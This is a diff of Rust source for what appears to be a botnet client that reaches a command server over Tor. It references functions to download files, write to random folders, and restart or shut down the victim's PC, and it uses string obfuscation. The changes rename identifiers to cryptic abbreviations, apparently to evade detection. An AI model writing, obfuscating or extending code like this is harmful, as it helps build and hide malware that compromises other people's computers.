@@ -14,7 +14,7 @@ use client_vars::{
     },
 };
 use shared::{
-    network::tor::{ LoggerConfig, ServerReceiveType, TorHandler },
+    network::tor::{ LoggerCnfg, SrvRcvTp, TrHandler },
     utils::functions::{ restart_pc_instant, shutdown_pc_instant, write_file_to_random_folder },
 };
 use obfstr::obfstr as s;
@@ -29,14 +29,14 @@ use super::basic::download_file_to_path;
 
 #[derive(Clone)]
 pub struct BotHandler {
-    tor_handler: TorHandler,
+    tor_handler: TrHandler,
     bot_state: Arc<RwLock<BotState>>,
     terminal: Option<Arc<Mutex<Terminal>>>,
 }
 
 impl BotHandler {
-    pub async fn new(logger_config: LoggerConfig) -> Result<Self> {
-        let tor_handler = TorHandler::new(logger_config).await?;
+    pub async fn new(logger_config: LoggerCnfg) -> Result<Self> {
+        let tor_handler = TrHandler::new(logger_config).await?;
         let bot_state = generate_bot_state().await;
         Ok(BotHandler {
             tor_handler,
@@ -77,7 +77,7 @@ impl BotHandler {
     }
 
     fn process_data(
-        tor_handler: TorHandler,
+        tor_handler: TrHandler,
         binary_data: Vec<u8>,
         self_ref: Arc<RwLock<Self>>
     ) -> Result<()> {
@@ -89,7 +89,7 @@ impl BotHandler {
     }
 
     fn route_data(
-        tor_handler: TorHandler,
+        tor_handler: TrHandler,
         processed_data: BoogeymanReceivePayload,
         self_ref: Arc<RwLock<Self>>
     ) -> Result<()> {
@@ -295,12 +295,12 @@ impl BotHandler {
         Ok(())
     }
     fn send_data(
-        tor_handler: &TorHandler,
+        tor_handler: &TrHandler,
         action: ServerAction,
         params: ServerParams
     ) -> Result<()> {
         let payload = BoogeymanSendPayload {
-            id: tor_handler.constant_device_id.read().unwrap().to_owned(),
+            id: tor_handler.dv_id.read().unwrap().to_owned(),
             version: client_version(),
             action,
             params,
@@ -310,6 +310,6 @@ impl BotHandler {
             ::to_vec(&payload)
             .context(s!("Failed to serialize ServerReceive struct to binary data").to_string())?;
 
-        tor_handler.add_to_send_queue(ServerReceiveType::Boogeyman, binary_data)
+        tor_handler.add_to_send_queue(SrvRcvTp::Bgm, binary_data)
     }
 }
